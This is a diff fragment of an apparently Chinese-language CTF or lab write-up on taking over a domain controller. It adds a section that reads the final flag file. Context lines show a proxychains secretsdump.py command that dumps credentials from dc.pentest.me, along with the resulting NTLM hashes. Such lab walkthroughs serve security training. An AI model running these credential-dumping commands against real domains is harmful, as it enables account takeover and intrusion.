@@ -991,6 +991,8 @@ flag{congratulations_get_DC!}
 C:\windows\system32> 
 ```
 
+
+
 dump哈希
 ```bash
 proxychains4 -f /usr/local/etc/proxychains-24.conf  secretsdump.py -k -no-pass Administrator@dc.pentest.me -dc-ip 172.24.7.3
@@ -1007,3 +1009,10 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:4dc9ff49be7d750c2ddc4bb297296
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 ```
+
+### flag
+```
+C:\windows\system32> type  C:\Users\Administrator\Desktop\flag.txt
+flag{congratulations_get_DC!}
+```
+
